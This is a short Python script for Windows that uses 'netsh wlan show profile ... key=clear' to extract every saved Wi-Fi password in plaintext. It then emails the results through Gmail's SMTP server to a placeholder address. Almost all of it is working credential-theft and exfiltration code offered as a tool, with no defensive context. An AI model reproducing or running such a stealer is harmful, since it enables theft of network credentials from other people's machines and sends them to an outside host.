#!/usr/bin/env python

# windows only
import subprocess, smtplib, re



def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587) # google allows anyone to use their smtp server
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()




# password google app password

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
networks = networks.decode('utf-8')
network_names = re.findall(r"(?:Profile\s*:\s)(.*)", networks)
result = ""
for network_name in network_names:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + str(current_result)


send_mail("youremail", "google app password", result)